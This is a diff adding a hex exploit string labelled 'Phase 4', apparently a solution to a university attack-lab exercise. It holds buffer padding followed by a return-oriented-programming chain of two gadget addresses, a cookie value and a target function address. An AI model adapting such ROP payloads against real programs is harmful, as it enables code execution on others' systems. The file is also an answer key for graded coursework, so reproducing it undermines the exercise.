@@ -1,0 +1,13 @@
+/* Phase 4 Exploit String */
+/* Buffer */
+00 00 00 00 00 00 00 00
+00 00 00 00 00 00 00 00
+00 00 00 00 00 00 00 00
+/* Gadget 1, popq %rax */
+1d 1b 40 00 00 00 00 00
+/* Cookie */
+60 5b 2e 1f 00 00 00 00
+/* Gadget 2, movq %rax, %rdi */
+09 1b 40 00 00 00 00 00
+/* Touch2 Address */
+4d 19 40 00 00 00 00 00
